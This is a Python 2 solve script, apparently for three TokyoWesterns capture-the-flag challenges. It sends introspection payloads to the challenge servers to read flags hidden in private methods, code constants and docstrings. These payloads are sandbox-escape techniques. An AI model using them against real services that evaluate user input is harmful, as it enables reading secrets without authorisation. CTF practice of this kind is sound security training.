import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def read_until_close(sc):
    while True:
        data = sc.recv(16384)
        if len(data) == 0:
            return
        for line in data.split("\n"):
            print repr(line)
    
def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

# private.py
sc = socket.create_connection(("ppc1.chal.ctf.westerns.tokyo", 10000))
sc.send("getattr(p,dir(p)[0])()")
sc.shutdown(socket.SHUT_WR) # gotta half-close the connection before server will respond
read_until_close(sc)

# local.py
sc = socket.create_connection(("ppc1.chal.ctf.westerns.tokyo", 10001))
sc.send("get_flag.__code__.co_consts")
sc.shutdown(socket.SHUT_WR)
read_until_close(sc)

# comment.py
sc = socket.create_connection(("ppc1.chal.ctf.westerns.tokyo", 10002))
sc.send("comment_flag.__doc__")
sc.shutdown(socket.SHUT_WR)
read_until_close(sc)